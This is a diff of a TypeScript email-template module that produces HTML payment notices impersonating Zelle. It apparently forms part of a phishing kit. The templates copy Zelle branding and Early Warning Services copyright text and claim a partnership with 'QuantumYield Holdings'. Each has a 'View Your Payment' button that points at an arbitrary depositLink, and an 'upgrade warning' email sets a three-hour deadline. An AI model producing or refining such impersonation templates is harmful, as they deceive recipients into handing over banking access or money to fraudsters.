@@ -8,11 +8,7 @@ interface EmailData {
   institution?: string
 }
 
-const ZELLE_LOGO_URL =
-  "https://www.zelle.com/themes/custom/zelle/images/zelle-logo-white.png"
-
-const ZELLE_FOOTER_LOGO_URL =
-  "https://www.earlywarning.com/sites/default/files/2025-09/Zelle-logo-no-tagline-RGB-purple_0.png"
+const ZELLE_LOGO_URL = "/images/zelle.svg"
 
 export function generateZelleEmailHtml(data: EmailData): string {
   const {
@@ -22,388 +18,439 @@ export function generateZelleEmailHtml(data: EmailData): string {
     transferId,
     depositLink,
     senderName = "Your Institution",
+    institution = "Banking System",
   } = data
 
-  const formattedAmount = `$${amount.toFixed(2)}`
+  const formattedAmount = amount.toFixed(2)
   const currentDate = new Date().toLocaleDateString("en-US", {
     year: "numeric",
     month: "long",
     day: "numeric",
   })
 
-  const messageBlock = message
-    ? `
-      <tr>
-        <td style="padding:24px 64px">
-          <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e2e2e2;border-left:4px solid #6D1ED4">
-            <tr>
-              <td style="padding:16px">
-                <div style="font-size:13px;color:#666;margin-bottom:6px">Message from sender</div>
-                <div style="font-size:15px;color:#111">${message}</div>
-              </td>
-            </tr>
-          </table>
-        </td>
-      </tr>`
-    : ""
-
-  return `<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Payment Notification</title>
-<style>
-body{margin:0;padding:0;background:#f5f5f5;font-family:Arial,Helvetica,sans-serif}
-table{border-collapse:collapse;mso-table-lspace:0pt;mso-table-rspace:0pt}
-img{border:0;display:block}
-a{text-decoration:none}
-@media only screen and (max-width:600px){
-  .container{width:100% !important}
-  .padding{padding:24px !important}
-}
-</style>
-</head>
-<body>
-
-<table width="100%" bgcolor="#f5f5f5" cellpadding="0" cellspacing="0">
-<tr>
-<td align="center">
-
-<table class="container" width="600" cellpadding="0" cellspacing="0" bgcolor="#ffffff">
-
-<!-- HEADER -->
-<tr bgcolor="#6D1ED4">
-<td style="padding:16px 32px;border-bottom:4px solid #6D1ED4">
-  <table width="100%">
-  <tr>
-    <td align="left">
-      <img src="${ZELLE_LOGO_URL}" width="120" alt="Zelle">
-    </td>
-    <td align="right" style="font-size:13px">
-      <a href="#" style="color:#fff">View in browser</a>
-      <span style="color:#fff"> | </span>
-      <a href="#" style="color:#fff">Support</a>
-    </td>
-  </tr>
-  </table>
-</td>
-</tr>
-
-<!-- HERO -->
-<tr>
-<td bgcolor="#f9f9f9" class="padding" style="padding:40px 64px">
-  <h2 style="margin:0;font-size:24px;color:#111">You've received a payment</h2>
-  <p style="margin:12px 0 0 0;font-size:16px;color:#444">Hello <strong>${recipientName}</strong>,</p>
-  <p style="margin:8px 0 0 0;font-size:16px;color:#444">${senderName} sent you money with Zelle.</p>
-</td>
-</tr>
-
-<!-- AMOUNT -->
-<tr>
-<td align="center" style="padding:24px">
-  <table width="80%" cellpadding="0" cellspacing="0">
-  <tr>
-    <td align="center" bgcolor="#6D1ED4" style="padding:20px;color:#ffffff">
-      <div style="font-size:14px;opacity:.9">Payment Amount</div>
-      <div style="font-size:28px;font-weight:bold">${formattedAmount}</div>
-    </td>
-  </tr>
-  </table>
-</td>
-</tr>
-
-${messageBlock}
-
-<!-- DETAILS -->
-<tr>
-<td style="padding:24px 64px">
-  <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e2e2e2">
-    <tr>
-      <td style="padding:12px;font-size:13px;color:#666">Date</td>
-      <td style="padding:12px;font-size:15px;color:#111">${currentDate}</td>
-    </tr>
-    <tr>
-      <td style="padding:12px;font-size:13px;color:#666;border-top:1px solid #f0f0f0">Reference</td>
-      <td style="padding:12px;font-size:15px;color:#111;border-top:1px solid #f0f0f0">${transferId}</td>
-    </tr>
-    <tr>
-      <td style="padding:12px;font-size:13px;color:#666;border-top:1px solid #f0f0f0">From</td>
-      <td style="padding:12px;font-size:15px;color:#111;border-top:1px solid #f0f0f0">${senderName}</td>
-    </tr>
-    <tr>
-      <td style="padding:12px;font-size:13px;color:#666;border-top:1px solid #f0f0f0">Amount</td>
-      <td style="padding:12px;font-size:15px;color:#111;border-top:1px solid #f0f0f0">${formattedAmount}</td>
-    </tr>
-  </table>
-</td>
-</tr>
-
-<!-- BUTTON -->
-<tr>
-<td align="center" style="padding:32px">
-  <table cellpadding="0" cellspacing="0">
-  <tr>
-    <td bgcolor="#6D1ED4" style="border-radius:6px">
-      <a href="${depositLink}" style="display:inline-block;padding:16px 32px;color:#ffffff;font-size:16px;font-weight:bold">
-        Accept Payment
-      </a>
-    </td>
-  </tr>
-  </table>
-</td>
-</tr>
-
-<!-- HOW IT WORKS -->
-<tr>
-<td style="padding:24px 64px">
-  <h3 style="margin:0 0 12px 0;font-size:16px;color:#111">How to receive your payment</h3>
-  <ol style="margin:0;padding-left:20px;color:#444;font-size:14px;line-height:1.7">
-    <li>Click the Accept Payment button above</li>
-    <li>Select your bank account</li>
-    <li>Confirm the deposit</li>
-    <li>The funds will appear in minutes</li>
-  </ol>
-</td>
-</tr>
-
-<!-- SECURITY -->
-<tr>
-<td style="padding:24px 64px">
-  <div style="font-size:12px;color:#666;line-height:1.6">
-    <strong>Security Notice</strong><br>
-    For your protection, do not forward this email.
-    This message contains confidential financial information intended only for the recipient.
-  </div>
-</td>
-</tr>
-
-<!-- FOOTER -->
-<tr>
-<td style="padding:32px;border-top:1px solid #e5e5e5">
-  <table width="100%">
-  <tr>
-    <td align="left">
-      <img src="${ZELLE_FOOTER_LOGO_URL}" width="110" alt="Zelle">
-    </td>
-    <td align="right" style="font-size:12px;color:#666">
-      &copy; 2026 Early Warning Services, LLC<br>All rights reserved
-    </td>
-  </tr>
-  </table>
-  <div style="margin-top:16px;font-size:12px;color:#666;line-height:1.6">
-    Zelle&reg; and the Zelle related marks are wholly owned by Early Warning Services, LLC.
-  </div>
-</td>
-</tr>
-
-</table>
-
-</td>
-</tr>
-</table>
-
-</body>
-</html>`
-}
-
-export function generatePendingDepositEmailHtml(data: EmailData): string {
-  const {
-    recipientName,
-    amount,
-    message,
-    transferId,
-    depositLink,
-    senderName = "Your Institution",
-  } = data
-
-  const formattedAmount = `$${amount.toFixed(2)}`
-  const currentDate = new Date().toLocaleDateString("en-US", {
+  const currentDateFr = new Date().toLocaleDateString("fr-CA", {
     year: "numeric",
     month: "long",
     day: "numeric",
   })
 
-  const messageBlock = message
-    ? `
-<tr>
-<td style="padding:24px 64px">
-  <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e2e2e2;border-left:4px solid #6D1ED4">
-    <tr>
-      <td style="padding:16px">
-        <div style="font-size:13px;color:#666;margin-bottom:6px">Message from sender</div>
-        <div style="font-size:15px;color:#111">${message}</div>
-      </td>
-    </tr>
-  </table>
-</td>
-</tr>`
-    : ""
-
-  return `<!DOCTYPE html>
-<html>
+  return `
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Pending Deposit Notification</title>
-<style>
-body{margin:0;padding:0;background:#f5f5f5;font-family:Arial,Helvetica,sans-serif}
-table{border-collapse:collapse;mso-table-lspace:0pt;mso-table-rspace:0pt}
-img{border:0;display:block}
-a{text-decoration:none}
-@media only screen and (max-width:600px){
-  .container{width:100% !important}
-  .padding{padding:24px !important}
-}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Zelle Payment</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background-color: #F5F5F5;
+      color: #333333;
+    }
+    .email-container {
+      max-width: 700px;
+      margin: 40px auto;
+      background-color: #ffffff;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+    }
+    .topbar {
+      background-color: #ffffff;
+      border-bottom: 4px solid #6D1ED4;
+      padding: 14px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+    .topbar-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .topbar img {
+      height: 50px;
+      display: block;
+    }
+    .dba {
+      background-color: #f3f4f6;
+      color: #6b7280;
+      font-weight: bold;
+      font-size: 12px;
+      padding: 6px 10px;
+      border-radius: 4px;
+    }
+    .topbar-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .lang-toggle {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+    .lang-toggle span {
+      color: #374151;
+      font-size: 13px;
+      opacity: 0.7;
+      cursor: pointer;
+      user-select: none;
+      padding: 4px 8px;
+      border-radius: 3px;
+      transition: background-color 0.2s, opacity 0.2s;
+    }
+    .lang-toggle span:hover {
+      opacity: 1;
+      background-color: rgba(109, 30, 212, 0.1);
+    }
+    .lang-toggle span.active {
+      font-weight: bold;
+      text-decoration: underline;
+      opacity: 1;
+      background-color: #6D1ED4;
+      color: #ffffff;
+    }
+    .brand {
+      background-color: #6D1ED4;
+      color: #ffffff;
+      font-weight: bold;
+      font-size: 16px;
+      padding: 8px 12px;
+      border-radius: 4px;
+    }
+    .content-wrapper {
+      padding: 32px 24px;
+    }
+    .lang-section {
+      display: none;
+    }
+    .lang-section.active {
+      display: block;
+    }
+    .greeting-section h1 {
+      font-size: 24px;
+      margin-bottom: 16px;
+      color: #000000;
+    }
+    .greeting-section p {
+      font-size: 15px;
+      line-height: 1.6;
+      margin-bottom: 12px;
+    }
+    .amount-box {
+      background-color: #6D1ED4;
+      color: #ffffff;
+      padding: 16px;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: bold;
+      text-align: center;
+      margin: 24px 0;
+    }
+    .details-card {
+      background-color: #ffffff;
+      border: 1px solid #dddddd;
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+    .details-card h3 {
+      font-weight: bold;
+      font-size: 16px;
+      margin-bottom: 16px;
+      margin-top: 0;
+    }
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 12px 0;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .detail-row:last-child {
+      border-bottom: none;
+    }
+    .detail-label {
+      font-weight: 600;
+      color: #666666;
+      font-size: 14px;
+    }
+    .detail-value {
+      color: #000000;
+      font-size: 14px;
+      text-align: right;
+    }
+    .message-box {
+      background-color: #f9f9f9;
+      border-left: 4px solid #6D1ED4;
+      padding: 16px;
+      margin: 20px 0;
+      border-radius: 4px;
+    }
+    .message-box strong {
+      display: block;
+      margin-bottom: 8px;
+      color: #000000;
+    }
+    .button-section {
+      text-align: center;
+      margin: 32px 0;
+    }
+    .deposit-button {
+      background-color: #6D1ED4;
+      color: #ffffff;
+      padding: 14px 30px;
+      font-weight: bold;
+      text-decoration: none;
+      border-radius: 6px;
+      display: inline-block;
+      font-size: 16px;
+      transition: background-color 0.2s;
+    }
+    .deposit-button:hover {
+      background-color: #5a18b5;
+    }
+    .instructions {
+      background-color: #f9f9f9;
+      padding: 20px;
+      border-radius: 8px;
+      margin: 24px 0;
+    }
+    .instructions h4 {
+      margin-top: 0;
+      font-size: 16px;
+    }
+    .instructions ol {
+      margin: 8px 0;
+      padding-left: 20px;
+    }
+    .instructions li {
+      margin: 8px 0;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+    .security-notice {
+      font-size: 13px;
+      color: #666666;
+      font-style: italic;
+      text-align: center;
+    }
+    .footer {
+      background-color: #f1f1f1;
+      padding: 16px;
+      font-size: 12px;
+      color: #666666;
+      text-align: center;
+    }
+    .footer a {
+      color: #2563eb;
+      text-decoration: none;
+    }
+    @media only screen and (max-width: 600px) {
+      .topbar {
+        padding: 12px;
+      }
+      .topbar-left,
+      .topbar-right {
+        flex-direction: column;
+        align-items: flex-start;
+        width: 100%;
+      }
+      .detail-row {
+        flex-direction: column;
+        gap: 4px;
+      }
+      .detail-value {
+        text-align: left;
+      }
+    }
+  </style>
 </head>
 <body>
+  <div class="email-container">
+    <div class="topbar">
+      <div class="topbar-left">
+        <img src="${ZELLE_LOGO_URL}" alt="Zelle" height="50">
+        <div class="dba" data-lang-key="dba">Partnered with QuantumYield Holdings</div>
+      </div>
+      <div class="topbar-right">
+        <div class="lang-toggle">
+          <span class="active" data-lang="en">EN</span>
+          <span data-lang="fr">FR</span>
+        </div>
+        <div class="brand">Zelle</div>
+      </div>
+    </div>
 
-<table width="100%" bgcolor="#f5f5f5" cellpadding="0" cellspacing="0">
-<tr>
-<td align="center">
+    <div class="content-wrapper">
+      <!-- English Content Section -->
+      <div class="lang-section active" data-lang="en">
+        <div class="greeting-section">
+          <h1>Hi ${recipientName},</h1>
+          <p>You've received a secure Zelle payment.</p>
 
-<table class="container" width="600" cellpadding="0" cellspacing="0" bgcolor="#ffffff">
+          <div class="amount-box">
+            Amount: $${formattedAmount} USD
+          </div>
 
-<!-- HEADER -->
-<tr bgcolor="#6D1ED4">
-<td style="padding:16px 32px;border-bottom:4px solid #6D1ED4">
-  <table width="100%">
-  <tr>
-    <td align="left">
-      <img src="${ZELLE_LOGO_URL}" width="120" alt="Zelle">
-    </td>
-    <td align="right" style="font-size:13px">
-      <a href="#" style="color:#fff">View in browser</a>
-      <span style="color:#fff"> | </span>
-      <a href="#" style="color:#fff">Support</a>
-    </td>
-  </tr>
-  </table>
-</td>
-</tr>
+          <div class="details-card">
+            <h3>Payment Details</h3>
+            <div class="detail-row">
+              <span class="detail-label">Date:</span>
+              <span class="detail-value">${currentDate}</span>
+            </div>
+            <div class="detail-row">
+              <span class="detail-label">From:</span>
+              <span class="detail-value">${institution}</span>
+            </div>
+            <div class="detail-row">
+              <span class="detail-label">Payment ID:</span>
+              <span class="detail-value">${transferId}</span>
+            </div>
+            <div class="detail-row">
+              <span class="detail-label">Amount:</span>
+              <span class="detail-value">$${formattedAmount} USD</span>
+            </div>
+          </div>
 
-<!-- HERO -->
-<tr>
-<td bgcolor="#f9f9f9" class="padding" style="padding:40px 64px">
-  <h2 style="margin:0;font-size:24px;color:#111">You have a pending deposit</h2>
-  <p style="margin:12px 0 0 0;font-size:16px;color:#444">Hello <strong>${recipientName}</strong>,</p>
-  <p style="margin:8px 0 0 0;font-size:16px;color:#444">${senderName} has initiated a Zelle deposit to your account. Please accept it to complete the transfer.</p>
-</td>
-</tr>
+          ${
+            message
+              ? `<div class="message-box">
+            <strong>Message (Optional):</strong>
+            ${message}
+          </div>`
+              : ""
+          }
 
-<!-- AMOUNT -->
-<tr>
-<td align="center" style="padding:24px">
-  <table width="80%" cellpadding="0" cellspacing="0">
-  <tr>
-    <td align="center" bgcolor="#6D1ED4" style="padding:20px;color:#ffffff">
-      <div style="font-size:14px;opacity:.9">Pending Deposit Amount</div>
-      <div style="font-size:28px;font-weight:bold">${formattedAmount}</div>
-    </td>
-  </tr>
-  </table>
-</td>
-</tr>
+          <div class="button-section">
+            <a href="${depositLink}" class="deposit-button">View Your Payment</a>
+          </div>
 
-${messageBlock}
+          <div class="instructions">
+            <h4>How Zelle works:</h4>
+            <ol>
+              <li>Funds are sent directly between bank accounts.</li>
+              <li>Money is typically available within minutes.</li>
+              <li>Check your bank account or Zelle app to see the payment.</li>
+              <li>No need to answer security questions - it's automatic!</li>
+            </ol>
+          </div>
 
-<!-- DETAILS -->
-<tr>
-<td style="padding:24px 64px">
-  <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e2e2e2">
-    <tr>
-      <td style="padding:12px;font-size:13px;color:#666">Date</td>
-      <td style="padding:12px;font-size:15px;color:#111">${currentDate}</td>
-    </tr>
-    <tr>
-      <td style="padding:12px;font-size:13px;color:#666;border-top:1px solid #f0f0f0">Reference</td>
-      <td style="padding:12px;font-size:15px;color:#111;border-top:1px solid #f0f0f0">${transferId}</td>
-    </tr>
-    <tr>
-      <td style="padding:12px;font-size:13px;color:#666;border-top:1px solid #f0f0f0">From</td>
-      <td style="padding:12px;font-size:15px;color:#111;border-top:1px solid #f0f0f0">${senderName}</td>
-    </tr>
-    <tr>
-      <td style="padding:12px;font-size:13px;color:#666;border-top:1px solid #f0f0f0">Amount</td>
-      <td style="padding:12px;font-size:15px;color:#111;border-top:1px solid #f0f0f0">${formattedAmount}</td>
-    </tr>
-    <tr>
-      <td style="padding:12px;font-size:13px;color:#666;border-top:1px solid #f0f0f0">Status</td>
-      <td style="padding:12px;font-size:15px;border-top:1px solid #f0f0f0">
-        <span style="display:inline-block;padding:2px 10px;background:#fff8e1;color:#b45309;border:1px solid #fcd34d;border-radius:4px;font-size:13px;font-weight:bold">Pending</span>
-      </td>
-    </tr>
-  </table>
-</td>
-</tr>
+          <p class="security-notice">
+            This is a secure transaction. For your security, please do not forward this email as it contains confidential information meant only for you.
+          </p>
+        </div>
+      </div>
 
-<!-- BUTTON -->
-<tr>
-<td align="center" style="padding:32px">
-  <table cellpadding="0" cellspacing="0">
-  <tr>
-    <td bgcolor="#6D1ED4" style="border-radius:6px">
-      <a href="${depositLink}" style="display:inline-block;padding:16px 32px;color:#ffffff;font-size:16px;font-weight:bold">
-        Accept Deposit
-      </a>
-    </td>
-  </tr>
-  </table>
-</td>
-</tr>
+      <!-- French Content Section -->
+      <div class="lang-section" data-lang="fr">
+        <div class="greeting-section">
+          <h1>Bonjour ${recipientName},</h1>
+          <p>Vous avez reçu un paiement Zelle sécurisé.</p>
 
-<!-- HOW IT WORKS -->
-<tr>
-<td style="padding:24px 64px">
-  <h3 style="margin:0 0 12px 0;font-size:16px;color:#111">How to accept your deposit</h3>
-  <ol style="margin:0;padding-left:20px;color:#444;font-size:14px;line-height:1.7">
-    <li>Click the Accept Deposit button above</li>
-    <li>Select your bank account</li>
-    <li>Confirm the deposit</li>
-    <li>The funds will appear in your account within minutes</li>
-  </ol>
-</td>
-</tr>
+          <div class="amount-box">
+            Montant : ${formattedAmount} $ USD
+          </div>
 
-<!-- SECURITY -->
-<tr>
-<td style="padding:24px 64px">
-  <div style="font-size:12px;color:#666;line-height:1.6">
-    <strong>Security Notice</strong><br>
-    For your protection, do not forward this email.
-    This message contains confidential financial information intended only for the recipient.
+          <div class="details-card">
+            <h3>Détails du paiement</h3>
+            <div class="detail-row">
+              <span class="detail-label">Date :</span>
+              <span class="detail-value">${currentDateFr}</span>
+            </div>
+            <div class="detail-row">
+              <span class="detail-label">De :</span>
+              <span class="detail-value">${institution}</span>
+            </div>
+            <div class="detail-row">
+              <span class="detail-label">ID du paiement :</span>
+              <span class="detail-value">${transferId}</span>
+            </div>
+            <div class="detail-row">
+              <span class="detail-label">Montant :</span>
+              <span class="detail-value">${formattedAmount} $ USD</span>
+            </div>
+          </div>
+
+          ${
+            message
+              ? `<div class="message-box">
+            <strong>Message (facultatif) :</strong>
+            ${message}
+          </div>`
+              : ""
+          }
+
+          <div class="button-section">
+            <a href="${depositLink}" class="deposit-button">Voir votre paiement</a>
+          </div>
+
+          <div class="instructions">
+            <h4>Comment fonctionne Zelle :</h4>
+            <ol>
+              <li>Les fonds sont envoyés directement entre comptes bancaires.</li>
+              <li>L'argent est généralement disponible en quelques minutes.</li>
+              <li>Vérifiez votre compte bancaire ou l'application Zelle pour voir le paiement.</li>
+              <li>Pas besoin de répondre à des questions de sécurité - c'est automatique!</li>
+            </ol>
+          </div>
+
+          <p class="security-notice">
+            Ceci est une transaction sécurisée. Pour votre sécurité, veuillez ne pas transférer cet courriel car il contient des informations confidentielles destinées uniquement à vous.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <p>© 2025 Early Warning Services, LLC. This email was sent to you on behalf of <strong>${institution}</strong> at <strong>${senderName}</strong>.</p>
+      <p style="margin-top: 8px;">
+        <a href="https://www.zellepay.com/user-service-agreement">User Service Agreement</a>
+      </p>
+      <p style="margin-top: 8px;">This is an automated email. Please do not reply to this message.</p>
+    </div>
   </div>
-</td>
-</tr>
 
-<!-- FOOTER -->
-<tr>
-<td style="padding:32px;border-top:1px solid #e5e5e5">
-  <table width="100%">
-  <tr>
-    <td align="left">
-      <img src="${ZELLE_FOOTER_LOGO_URL}" width="110" alt="Zelle">
-    </td>
-    <td align="right" style="font-size:12px;color:#666">
-      &copy; 2026 Early Warning Services, LLC<br>All rights reserved
-    </td>
-  </tr>
-  </table>
-  <div style="margin-top:16px;font-size:12px;color:#666;line-height:1.6">
-    Zelle&reg; and the Zelle related marks are wholly owned by Early Warning Services, LLC.
-  </div>
-</td>
-</tr>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const langToggles = document.querySelectorAll('.lang-toggle span[data-lang]');
+      const langSections = document.querySelectorAll('.lang-section[data-lang]');
+      const html = document.documentElement;
 
-</table>
+      langToggles.forEach(toggle => {
+        toggle.addEventListener('click', function() {
+          const selectedLang = this.getAttribute('data-lang');
 
-</td>
-</tr>
-</table>
+          langToggles.forEach(t => t.classList.remove('active'));
+          this.classList.add('active');
 
+          html.setAttribute('lang', selectedLang);
+
+          langSections.forEach(section => {
+            if (section.getAttribute('data-lang') === selectedLang) {
+              section.classList.add('active');
+            } else {
+              section.classList.remove('active');
+            }
+          });
+
+          const dba = document.querySelector('.dba');
+          if (selectedLang === 'fr') {
+            dba.textContent = 'Partenaire de QuantumYield Holdings';
+          } else {
+            dba.textContent = 'Partnered with QuantumYield Holdings';
+          }
+        });
+      });
+    });
+  </script>
 </body>
-</html>`
+</html>
+`
 }
 
 export type EmailLang = "en" | "fr"
@@ -423,7 +470,7 @@ export function generateUpgradeWarningEmail(data: {
     recipientName,
     institution = "QuantumYield Holdings",
     upgradeDeadline = "within 3 hours",
-    supportLink = "https://www2.swift.com/mystandards/#/c/settlement-and-reconciliation",
+    supportLink = "https://support.zellepay.com",
   } = data
 
   return `
